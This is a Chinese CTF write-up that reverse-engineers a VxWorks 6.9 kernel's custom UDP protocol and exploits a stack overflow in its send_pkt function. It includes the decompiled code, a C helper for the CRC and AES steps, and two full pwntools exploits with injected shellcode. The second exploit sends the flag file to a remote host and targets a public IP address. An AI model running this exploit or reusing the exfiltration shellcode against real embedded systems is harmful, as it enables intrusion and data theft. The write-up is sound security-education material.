# realworld CTF 20-21 easy_work

阅读量 **190571**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-02-07 16:30:25

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 0x01 题目分析

###  1.1 安全措施

​ 解压fd.img文件得到vxwroks内核文件，通过分析可以发现，该内核文件为vxworks6.9，缺少符号表。

![](https://p5.ssl.qhimg.com/t014ec53f9b6457b141.png)

​ 未开启任何保护措施。

![](https://p2.ssl.qhimg.com/t015c7b9d6223584fa9.png)

###  1.2 静态分析内核文件

​
发现特殊字符，经过初步判断此题应该是基于vxworks内核的私有协议分析题目，自定义该私有协议为PKT，通过与有符号表的vxworks6.9内核固件进行比对，发现该内核文件中缺失很多工具，导致无法直接获取shell接口。

![](https://p2.ssl.qhimg.com/t01a2efcf04e0e780e9.png)

​ 进入可以发现加密操作：

![](https://p1.ssl.qhimg.com/t01b860f2611e4dac55.png)

​ 经过逆向分析可以还原该部分函数过程：

    
    
    int parpare()
    {
      int result; // eax
    
      ip_addr = malloc(20u);
      memcpy(ip_addr, a192168251, 0xEu);            // 设置IP地址
      ip_len = (int)malloc(4u);
      *(_DWORD *)ip_len = 0x14;                     // 设置IP地址长度
      port = (int)malloc(4u);
      *(_WORD *)port = 0x1234;                      // 设置PORT
      BEAT = malloc(5u);
      strcpy((char *)BEAT, "beat");
      len_4 = (int)malloc(4u);
      *(_DWORD *)len_4 = 4;
      key_init = malloc(0x10u);
      memcpy(key_init, &Key_init, 0x10u);// 0x4d251f: init{ 01234567 89abcdef fedcba98 76543210}
      AES_init_ctx((int)&CTX, (int)key_init);
      password1 = malloc(0xFu);
      strcpy((char *)password1, "dorimifasolaxi");  // 设置IV
      dword_4E265C = (int)malloc(4u);
      result = dword_4E265C;
      *(_DWORD *)dword_4E265C = 15;
      return result;
    }
    

​ 经过分析可以发现该过程是初始化一些参数，包括设置ip地址，ip地址长度，端口号，秘钥参数，IV向量等参数。

​
进入接收数据包的函数，自定义命名为recv_pkt()函数，经过逆向比对分析可以还原该私有协议的交互过程，此PKT协议使用了vxworks独有的套接字zbuf，但是与socket套接字类似，只是参数使用和交互过程上有一些区别，后面会附上zbuf套接字的使用方法。

    
    
    int recv_pkt()
    {
      int RecvBuff; // [esp+18h] [ebp-60h] BYREF
      char ipaddr[18]; // [esp+1Eh] [ebp-5Ah] BYREF
      socklen_t sockAddrSize; // [esp+30h] [ebp-48h] BYREF
      caddr_t recvBuff; // [esp+34h] [ebp-44h] BYREF
      sockaddr clientAddr; // [esp+44h] [ebp-34h] BYREF
      struct sockaddr server_addr; // [esp+54h] [ebp-24h] BYREF
      int Recvlen; // [esp+64h] [ebp-14h] BYREF
      int Recvfd; // [esp+68h] [ebp-10h]
      int server_sockfd; // [esp+6Ch] [ebp-Ch]
      unsigned int encoded_crc32; // [esp+74h] [ebp-4h]
    
      sockAddrSize = 0x10;
      bzero(&server_addr, 0x10u);
      server_addr.sa_family = 0x210;                // AF_INET
      *(_WORD *)server_addr.sa_data = 53767;        // PORT
      *(_DWORD *)&server_addr.sa_data[2] = 0;       // ipaddr
      parpare();    //初始化参数
      server_sockfd = socket(2, 2, 0);//创建TCP流socket
      if ( server_sockfd != -1 )
      {
        if ( bind(server_sockfd, &server_addr, sockAddrSize) == -1 )//监听
        {
          perror(aBind);
          close(server_sockfd);
          return -1;
        }
        while ( 1 )
        {
          while ( 1 )
          {
            do
            {
              do
                Recvfd = zbufSockRecvfrom(server_sockfd, 0, &Recvlen, &clientAddr, (int)&sockAddrSize);   //接收远程数据包
              while ( !Recvfd );
            }
            while ( Recvlen <= 0 );
            memset(encrypt_message, 0, 2048);
            sprintf_1(*(int *)&clientAddr.sa_data[2], (int)ipaddr);//提取客户端信息IP
            printf(
              "RECV PKT FROM (%s, port %d):\n",
              ipaddr,
              (unsigned __int16)(*(_WORD *)clientAddr.sa_data << 8) | HIBYTE(*(_WORD *)clientAddr.sa_data));
            if ( (unsigned int)Recvlen > 0xF && Recvlen <= 2047 )
              break;
    LABEL_11:
            perror(aWrongPktFormat);
            zbufDelete(Recvfd);
          }
          zbufExtractCopy(Recvfd, 0, 0, (char *)&recvBuff, 0x10);// 从接收报文的ZBUF中提取客户端的请求信息
          zbufCut(Recvfd, 0, 0, 16);                // 去掉提取的16字节数据
          encoded_crc32 = 0;
          RecvBuff = 0;
          encoded_crc32 = crc32(0, (char *)&recvBuff, 12);// crc32加密
          encoded_crc32 = crc32(encoded_crc32, (char *)&RecvBuff, 4);//crc加密验证
          Recvlen -= 16;
          if ( (unsigned __int16)recvBuff.klen == Recvlen && Recvlen > 0 )
          {
            sub_40EB4C(Recvfd, 0, 0, Recvlen, (int)encrypt_message);
            encoded_crc32 = crc32(encoded_crc32, encrypt_message, Recvlen);//
            if ( recvBuff.encode_crc32 != encoded_crc32 )
              goto LABEL_11;
            memset((char *)(Recvlen + 0x504200), 0, 1);
            take_packet((int)encrypt_message, Recvlen, (int)&recvBuff);//数据包处理函数
          }
          else
          {
            printf("?");
          }
          zbufDelete(Recvfd);
        }
      }
      perror(s);
      return -1;
    }
    

​
经过分析该过程有一个加解密过程，发送的数据包需要经过CRC32加密并且校验通过才可以通过验证，真正处理数据包的函数为sub_40f735，此处命名为take_packet()函数，经过逆向分析可以得到如下过程。

    
    
    int __cdecl take_packet(int encrypt_message, unsigned __int16 RecvLen, int RecvBuff)
    {
      int v4; // [esp+10h] [ebp-18h]
      unsigned __int16 v5; // [esp+14h] [ebp-14h]
      char v6[8]; // [esp+18h] [ebp-10h] BYREF
      int v7; // [esp+20h] [ebp-8h]
      int v8; // [esp+24h] [ebp-4h]
    
      v5 = RecvLen;
      clock_gettime(0, v6);
      if ( *(_DWORD *)RecvBuff != 0x4B5C6D7E )      // magic校验
        return -3;
      if ( *(_BYTE *)(RecvBuff + 7) )     //数据包第7bit不为0,case2
      {
        if ( *(_BYTE *)(RecvBuff + 7) == 1 ) //数据包第7bit为1
        {
          if ( *(_BYTE *)(RecvBuff + 6) != 2 && *(_BYTE *)(RecvBuff + 6) != 1 && *(_BYTE *)(RecvBuff + 6) )    //数据包第6bit只能选2,1,0,case1
            return -2;
          xor_0x77(encrypt_message, RecvLen);//做异或
        }
        else
        {
          if ( *(_BYTE *)(RecvBuff + 7) != 2 )//数据包第7bit为2报错
            return -16;
          if ( *(_BYTE *)(RecvBuff + 6) != 3 && *(_BYTE *)(RecvBuff + 6) != 1 && *(_BYTE *)(RecvBuff + 6) )  //数据包第6bit只能选3,1,0，否则报错，case1
            return -2;
          AES_init_ctx_iv((AES_CTX *)&CTX, (int)IV);  //AES IV初始化
          stream_dec((AES_CTX *)&CTX, encrypt_message, RecvLen); //AES解密加密数据包
          v8 = check_mesage(encrypt_message, RecvLen);//解密后数据包数据校验
          if ( v8 < 0 )
            return -4;
          v5 = RecvLen - v8;
        }
      }
      else if ( *(_BYTE *)(RecvBuff + 6) )
      {
        return -1;
      }
      v7 = function(encrypt_message, v5, *(_BYTE *)(RecvBuff + 6));//发现功能函数
      if ( v7 )
        v4 = v7;
      else
        v4 = 0;
      return v4;
    }
    

​ 发现功能函数function()，经过分析可以得知通过构造一定的参数可以实现修改多个位置参数的数值。并且发现栈溢出。

    
    
    int __cdecl function(int message, unsigned __int16 recvlen_2, char RecvBuff_6)
    {
      unsigned int v3; // eax
      int v5; // [esp+14h] [ebp-184h]
      int v7[80]; // [esp+34h] [ebp-164h] BYREF
      _DWORD v8[3]; // [esp+174h] [ebp-24h] BYREF
      int v9; // [esp+180h] [ebp-18h]
      int i; // [esp+184h] [ebp-14h]
      void *dest; // [esp+188h] [ebp-10h]
      int v12; // [esp+18Ch] [ebp-Ch]
      unsigned int v13; // [esp+190h] [ebp-8h]
      unsigned __int16 tag; // [esp+196h] [ebp-2h]
    
      switch ( RecvBuff_6 )
      {
        case 2:
          if ( !sub_40EEEC(message, recvlen_2) )
            return -35;
          dest = malloc(0x2000u);
          sub_40E919(v8);
          v3 = strlen((const char *)message);
          v9 = sub_40E4C3(v8, message, v3, v7, 20);
          if ( v9 <= 0 || v7[0] != 1 )
            return -36;
          for ( i = 1; i < v9; ++i )
          {
            if ( !sub_40E97F(message, &v7[4 * i], aMasteraddr) )
            {
              memset((char *)dest, 0, 0x2000);
              memcpy(dest, (const void *)(message + v7[4 * i + 5]), v7[4 * i + 6] - v7[4 * i + 5]);
              set_ipaddr(dest, v7[4 * i + 6] - v7[4 * i + 5]);
              ++i;
            }
          }
          for ( i = 1; i < v9; ++i )
          {
            if ( !sub_40E97F(message, &v7[4 * i], aKey) )
            {
              memset((char *)dest, 0, 0x2000);
              memcpy(dest, (const void *)(message + v7[4 * i + 5]), v7[4 * i + 6] - v7[4 * i + 5]);
              set_password((const char *)dest, v7[4 * i + 6] - v7[4 * i + 5]);
              ++i;
            }
          }
          for ( i = 1; i < v9; ++i )
          {
            if ( !sub_40E97F(message, &v7[4 * i], aMasterport) )
            {
              memset((char *)dest, 0, 0x2000);
              memcpy(dest, (const void *)(message + v7[4 * i + 5]), v7[4 * i + 6] - v7[4 * i + 5]);
              v12 = sub_419B18(dest);
              if ( v12 <= 65534 && v12 > 0 )
                set_port((unsigned __int16)dest);
              ++i;
            }
          }
          free(dest);
          break;
        case 3:
          v13 = *(_DWORD *)message;
          tag = *(_WORD *)(message + 4);
          if ( v13 > 4 || recvlen_2 <= 6u || tag != recvlen_2 - 6 )
            return -37;
          switch ( v13 )
          {
            case 0u:
              set_ipaddr((void *)(message + 6), tag);//重新设置ip地址和大小，但是ip地址和ip_len长度没有限制
              break;
            case 1u:
              if ( tag != 2 )
                return -40;
              set_port(*(_WORD *)(message + 6));//重新设置端口号，大小两个字节
              break;
            case 2u:
              set_password((const char *)(message + 6), tag);//重新设置密码，长度没有限制
              break;
            case 3u:
              if ( tag != 16 )
                return -41;
              set_IV((void *)message); //设置IV
              break;
            case 4u:                                // beat
              set_BEAT((const char *)(message + 6), tag);//设置BEAT字符串，长度没有限制
              break;
          }
          break;
        case 1:
          if ( *(_DWORD *)dword_4E265C != recvlen_2 )
            return -33;
          if ( memcmp(message, (int)password1, recvlen_2) )
            return -34;
          send_pkt();//发送数据包
          break;
        default:
          printf("ping");
          return 0;
      }
      return v5;
    }
    

通过分析可以得到，在send_pkt函数中，有一个明显的栈溢出：

    
    
    int send_pkt()
    {
      int v1; // [esp+20h] [ebp-48h]
      char v2[18]; // [esp+26h] [ebp-42h] BYREF
      char dest[20]; // [esp+38h] [ebp-30h] BYREF
      struct sockaddr addr; // [esp+4Ch] [ebp-1Ch] BYREF
      int v5; // [esp+5Ch] [ebp-Ch]
      int fd; // [esp+60h] [ebp-8h]
    
      bzero(&addr, 0x10u);
      addr.sa_family = 0x210;
      *(_WORD *)addr.sa_data = (*(_WORD *)port << 8) | HIBYTE(*(_WORD *)port);
      memcpy(dest, ip_addr, *(_DWORD *)ip_len);//栈溢出，由于dest空间只有0x20字节，而ip_len长度没有限制，ip_addr控制可以由我们进行控制，造成任意长度栈溢出。
      inet_aton((int)ip_addr, &addr.sa_data[2]);
      v5 = socket(2, 2, 0);
      if ( v5 == -1 || (fd = socket(2, 1, 0), fd == -1) )
      {
        perror(s);
        v1 = -1;
      }
      else
      {
        connect(fd, &addr, 0x10u);
        if ( zbufSockBufSend(fd, (int)BEAT, *(_DWORD *)len_4, (int)sub_40EB47, 0, 0) == -1 )
        {
          perror(aZbufsockbufsen);
          close(fd);
          v1 = -1;
        }
        else
        {
          close(fd);
          sprintf_1(*(int *)&addr.sa_data[2], (int)v2);
          printf(
            "SEND BEAT TO (%s, port %d):\n",
            v2,
            (unsigned __int16)(*(_WORD *)addr.sa_data << 8) | (unsigned __int8)addr.sa_data[1]);
          if ( zbufSockBufSendto(v5, (int)BEAT, *(_DWORD *)len_4, (int)sub_40EB47, 0, 0, &addr, 0x10u) == -1 )
          {
            perror(aZbufsockbufsen);
            close(v5);
            v1 = -1;
          }
          else
          {
            close(v5);
            v1 = 0;
          }
        }
      }
      return v1;
    }
    

###  1.3 数据包格式分析

​ 攻击分两部分，一部分是提前植入攻击代码在ip_addr全局变量区，第二部分触发攻击代码，栈溢出执行攻击代码。其中数据包格式如下：

    
    
    ##第一层封装
    crc32[magic + packet_len + case1 + case2 + pad + encrypt_AES[packet]]
    //magic = 4b5c6d7e  4byte  函数标识
    //packet_len = len(packet)  2byte 后续加密数据包长度  2byte
    //case1 = 3,1,0，选择功能函数选项，填3会进入参数设置区，选择1会进入send_pkt函数区 1byte
    //case2 = 2,1   选择解密方式，为了触发漏洞这里填2        1byte
    ##第二层封装
    encrypt_AES[case3 + payload_len + payload]
    //case3 = 0,1,2,3,4 其中0为修改set_ipaddr，1为set_port，2为set_password,3为set_IV，4为set_BEAT    4byte
    //payload_len = len(payload) 2byte
    //payload 攻击代码
    

###  1.4 crc32解密与AES解密

​
数据包分析中可以发现，数据包需要通过CRC32校验和AES解密，才能把真正的packet发送到服务器中，在前面的分析中我们可以找到固定IV和口令，加密算法为AES_CBC模式，为了节省时间，可以使用内核文件中的加解密函数。

    
    
    #include <stdio.h>
    #include <string.h>
    #include <fcntl.h>
    #include <stdint.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    
    const char *executable = "./easy_works.elf";
    
    int main(int argc, char *argv[])
    {
        if (argc < 2) {
            return -1;
        }
    
        int exe = open(executable, O_RDONLY);
        if (exe == -1) {
            perror("open");
            return -1;
        }
    
        if (mmap((void *)0x00408000, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == MAP_FAILED) {
            perror("mmap");
            return -1;
        }
    
        if (lseek(exe, 0x80, SEEK_SET) == -1 || read(exe, (void *)0x00408000, 0xdf330) != 0xdf330) {
            perror("read");
            return -1;
        }
        void *ctx = (void *)0x504A00;
    
        void (*init_ctx)(void *, void *);
        *(uintptr_t *)&init_ctx = 0x40CFC5;
    
        void (*stream_dec)(void *, void *, int);
        void (*stream_enc)(void *, void *, int);
        *(uintptr_t *)&stream_dec = 0x40DF63;
        *(uintptr_t *)&stream_enc = 0x40DEED;
        void (*block_dec)(void *, void *);
        void (*block_enc)(void *, void *);
        *(uintptr_t *)&block_dec = 0x40DE0F;
        *(uintptr_t *)&block_enc = 0x40DD84;
        void (*set_iv)(void *, void *);
        *(uintptr_t *)&set_iv = 0x40D019;
    
        uint32_t (*crc32)(uint32_t, void *, uint32_t);
        *(uintptr_t *)&crc32 = 0x40E93B;
    
        uint8_t A[0x4000] = {0}, B[0x4000] = {0};
        int n = read(0, &A, 0x4000);
        if (!strcmp(argv[1], "enc")) {
            if (n % 0x10) {
                uint8_t pad = 0x10 - n % 0x10;
                while (n % 0x10) A[n++] = pad;
            }
            init_ctx(ctx, (void *)0x4D251F);//0x4d251f: init{ 01234567 89abcdef fedcba98 76543210}
            set_iv(ctx, "12345678abcdefgh");
            stream_enc(ctx, &A, n);
            memcpy(&B, &A, 0x4000);
            init_ctx(ctx, (void *)0x4D251F);//0x4d251f: init{ 01234567 89abcdef fedcba98 76543210}
            set_iv(ctx, "12345678abcdefgh");
            stream_dec(ctx, &B, n);
            //write(1, &B, n);
        } 
        else if (!strcmp(argv[1], "crc")) {
            *(uint32_t *)&A[0xc] = 0;
            uint32_t res = crc32(0, &A, n);
            *(uint32_t *)&A[0xc] = res;
        }
        write(1, &A, n);
        //printf() 
        return 0;
    
    }
    

编译加解密函数：

    
    
    gcc -m32 -fno-stack-protector -no-pie easy_works.c -o e  #32bit 关闭地址随机化
    

###  1.5 攻击过程

攻击代码触发后，栈空间如下：

![](https://p2.ssl.qhimg.com/t01556e738d16fb9722.png)

​ 自己构造一个验证漏洞触发的exp：

    
    
    from pwn import *
    
    # rwctf{3af93fd83c6d9b4188d236225347e480}
    
    context.log_level = 'debug'
    context.arch = 'i386'
    
    HOST = '10.0.2.2'
    PORT = 0x4141
    
    def encrypt(s):
        p = process(['./e', 'enc'])
        p.send(s)
        p.shutdown()
        d = p.recvall()
        assert len(d) >= len(s)
        print('enc %d %s => %d %s' % (len(s), s, len(d), d.hex()))
        return d
    
    def fix_crc(s):
        p = process(['./e', 'crc'])
        p.send(s)
        p.shutdown()
        d = p.recvall()
        assert len(d) == len(s)
        print('crc %s => %s' % (s, d.hex()))
        return d
    
    magic = b'\x7E\x6D\x5C\x4B'
    
    _open = 0x487E6E
    _read = 0x487925
    _printf = 0x482C0A
    _socket = 0x4B1DB2
    _connect = 0x4B1B53
    zbufSockBufSendto = 0x454C4F
    ebp = 0x677608
    filename = ebp - 0x30 + 0x200
    sockaddr = filename + 0x20
    payload = b'0.0.0.0\x00'.ljust(0x30, b'X')
    payload += p32(ebp - 0x300) + p32(ebp + 8)
    payload += asm('''
    sub esp, 0x400
    xor eax, eax
    mov [esp+8], eax
    ; mov eax, 2
    mov [esp+4], eax
    mov eax, %#x
    mov [esp], eax
    mov eax, %#x
    call eax
    
    mov ecx, 0x100
    mov [esp+8], ecx
    lea ebx, [esp + 0x80]
    mov [esp+4], ebx
    mov [esp], eax
    mov edx, %#x
    call edx
    
    lea ebx, [esp + 0x80]
    mov [esp], ebx
    mov eax, %#x
    call eax
    ''' % (filename, _open, _read, _printf))
    payload = payload.ljust(0x200)
    payload += b'/ata01:1/flag\x00'.ljust(0x20)
    
    master_addr = encrypt(p32(0) + p16(len(payload)) + payload)
    set_master_addr_pkt = fix_crc(magic + p16(len(master_addr)) + p8(3) + p8(2) + p32(0) + p32(0) + master_addr)
    
    key = encrypt(b'dorimifasolaxi\x00')
    req_beat_pkt = fix_crc(magic + p16(len(key)) + p8(1) + p8(2) + p32(0) + p32(0) + key)
    
    r = remote('127.0.0.1', 2002, typ='udp')
    
    r.send(set_master_addr_pkt)
    raw_input('beat')
    r.send(req_beat_pkt)
    

攻击效果如下：

![](https://p1.ssl.qhimg.com/t01e2cca8be494c4529.png)

附上通过zbufSockbufsend函数将flag传送到远端的exp，但是我自己搭建的环境并没有成功，包括我使用sendto进行发送依旧连接不成功，不知道为何，请各位大牛赐教：

    
    
    from pwn import *
    
    # rwctf{3af93fd83c6d9b4188d236225347e480}
    
    context.arch = 'i386'
    
    HOST = '127.0.0.1'
    PORT = 0x4141
    
    def encrypt(s):
        p = process(['./e', 'enc'])
        p.send(s)
        p.shutdown()
        d = p.recvall()
        assert len(d) >= len(s)
        print('enc %d %s => %d %s' % (len(s), s.hex(), len(d), d.hex()))
        return d
    
    def fix_crc(s):
        p = process(['./e', 'crc'])
        p.send(s)
        p.shutdown()
        d = p.recvall()
        assert len(d) == len(s)
        print('crc %s => %s' % (s.hex(), d.hex()))
        return d
    
    magic = b'\x7E\x6D\x5C\x4B'
    
    _open = 0x487E6E
    _read = 0x487925
    _printf = 0x482C0A
    _socket = 0x4B1DB2
    _connect = 0x4B1B53
    zbufSockBufSend = 0x454C4F
    ebp = 0x677608
    filename = ebp - 0x30 + 0x200
    sockaddr = filename + 0x20
    payload = b'0.0.0.0\x00'.ljust(0x30, b'X')
    payload += p32(ebp - 0x300) + p32(ebp + 8)
    payload += asm('''
    sub esp, 0x400
    xor eax, eax
    mov [esp+8], eax
    ; mov eax, 2
    mov [esp+4], eax
    mov eax, %#x
    mov [esp], eax
    mov eax, %#x
    call eax
    
    mov ecx, 0x100
    mov [esp+8], ecx
    lea ebx, [esp + 0x80]
    mov [esp+4], ebx
    mov [esp], eax
    mov edx, %#x
    call edx
    
    xor eax, eax
    mov [esp+8], eax
    inc al
    mov [esp+4], eax
    inc al
    mov [esp], eax
    mov eax, %#x
    call eax
    
    mov [esp+0x60], eax
    
    mov [esp], eax
    mov eax, %#x
    mov [esp+4], eax
    mov eax, 16
    mov [esp+8], eax
    mov eax, %#x
    call eax
    
    mov eax, [esp+0x60]
    mov [esp], eax
    lea ebx, [esp + 0x80]
    mov [esp+4], ebx
    mov eax, 0x100
    mov [esp+8], eax
    xor eax, eax
    mov [esp+0xc], eax
    mov [esp+0x10], eax
    mov [esp+0x14], eax
    mov eax, %#x
    call eax
    ''' % (filename, _open, _read, _socket, sockaddr, _connect, zbufSockBufSend))
    payload = payload.ljust(0x200)
    payload += b'/ata01:1/flag\x00'.ljust(0x20)
    payload += b'\x10\x02' + p16(PORT) + bytes(map(int, HOST.split('.')))
    
    print len(payload)
    master_addr = encrypt(p32(0) + p16(len(payload)) + payload)
    set_master_addr_pkt = fix_crc(magic + p16(len(master_addr)) + p8(3) + p8(2) + p32(0) + p32(0) + master_addr)
    
    key = encrypt(b'dorimifasolaxi\x00')
    req_beat_pkt = fix_crc(magic + p16(len(key)) + p8(1) + p8(2) + p32(0) + p32(0) + key)
    
    r = remote('13.52.189.117', 39707, typ='udp')
    
    r.send(set_master_addr_pkt)
    raw_input('beat')
    r.send(req_beat_pkt)
    

## 0x02 基础知识-zbuf套接字及其应用

​ VxWorks除了支持标准的BSD4.4套接字接口外，还提供了一种零拷贝缓冲区（Zero-copy Buffer，简称ZBUF）套接字接口。

    
    
    //接收数据函数usrSockRecv
    int usrSockRecv{
        int fd,/*套接字文件描述符*/
        char *buf, /*接收数据缓冲区*/
        int bufLength,/*缓冲区长度*/
        int flags,/*数据类型标识符*/
    }
    

ZBUF套接字的网络通信模型应用

    
    
    //1、建立套接字
    fd = socket(AF_INET,SOCK_DGRAM,0)
    //2、绑定套接字
    bind(fd,(struct sockaddr *)&serverAddr,sockAddrSize)
    //3、接收报文
    Recvfd = zbufSockRecvfrom(fd,0,&recvlen，（struct sockaddr *）&clientAddr,&sockAddrSize)
    ZBUF_ID zbufSockRecvfrom
        (
        int               s,       /* socket to receive from */
        int               flags,   /* flags to underlying protocols */
        int *             pLen,    /* number of bytes requested/returned */
        struct sockaddr * from,    /* where to copy sender's addr */
        int *             pFromLen /* value/result length of from */
        )
    
        //4、zbuf数据操作
    zbufExtractCopy(Recvfd,NULL,0,(caddr_t)&recvBuff,bufflength)
    //该函数从接收报文的ZBUF中提取客户端的请求信息。
    
    int zbufExtractCopy
        (
        ZBUF_ID  zbufId,  /* zbuf from which data is copied */
        ZBUF_SEG zbufSeg, /* zbuf segment base for offset */
        int      offset,  /* relative byte offset */
        caddr_t  buf,     /* buffer into which data is copied */
        int      len      /* number of bytes to copy */
        )
    ZBUF_SEG zbufCut
        (
        ZBUF_ID  zbufId,  /* zbuf from which bytes are cut */
        ZBUF_SEG zbufSeg, /* zbuf segment base for offset */
        int      offset,  /* relative byte offset */
        int      len      /* number of bytes to cut */
        )
    
    //zbufInsert(zSendfd,0,segLen,zMsgfd)，函数zbufInsert()将需要发送的数据插入一个ZBUF中准备发送。
    ZBUF_SEG zbufInsert
        (
        ZBUF_ID  zbufId1, /* zbuf to insert zbufId2 into */
        ZBUF_SEG zbufSeg, /* zbuf segment base for offset */
        int      offset,  /* relative byte offset */
        ZBUF_ID  zbufId2  /* zbuf to insert into zbufId1 */
        )
    
    //5、发送报文
    zbufSockSendto(fd,zSendfd,zbuflength(zSendfd),0,(struct sockaddr *)&clientAddr,sockAddrSize)
    zbufSockBufSend()
    //关闭ZBUF、关闭套接字
    zbufDelete(zSendfd)
    close(fd)
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Joy_boy** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/230026](/post/id/230026)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __1赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) Joy_boy

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

